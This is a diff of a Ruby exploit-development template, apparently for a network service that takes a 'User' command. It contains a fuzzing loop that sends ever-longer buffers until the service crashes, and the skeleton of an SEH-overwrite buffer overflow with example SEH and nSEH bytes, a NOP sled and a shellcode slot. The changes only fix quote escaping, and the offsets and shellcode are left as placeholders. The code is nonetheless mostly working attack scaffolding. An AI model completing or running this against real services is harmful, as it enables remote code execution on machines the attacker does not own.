@@ -25,13 +25,13 @@ while true
     s.connect(socket_addr)
     s.recv(1024)
 
-    puts "+'"Sending buffer with length #{buff.length.to_s}"'+"
-    s.send("+'"User #{buff}rn", 0'+")
+    puts \"Sending buffer with length \#{buff.length.to_s}\"
+    s.send(\"User \#{buff}rn\", 0)
     s.close()
     sleep(1)
     buff = buff + 'x41'*50
   rescue
-    puts "+'"[+] Crash occured with buffer length #{(buff.length - 50).to_s}"'+"
+    puts \"[+] Crash occured with buffer length \#{(buff.length - 50).to_s}\"
     exit
   end
 end
@@ -51,9 +51,9 @@ shellcode = ( )
 OFFSET = #Enter NUM
 BYTES  = #Enter NUM
 
-SEH  = # Ex. "+'"\xEB\x06\x90\x90"'+"
-nSEH = # Ex. "+'"\x19\x76\x61\x61"'+"
-nops = " + '"\x90"' +" * 20 + shellcode
+SEH  = # Ex. \"\xEB\x06\x90\x90\"
+nSEH = # Ex. \"\x19\x76\x61\x61\"
+nops = \"\x90\" * 20 + shellcode
 
 # Designed to deal with SEH (POP,POP,RET)
 buffer = \"A\" * OFFSET + SEH + nSEH + nops + \"B\" * (BYTES - nops.length)
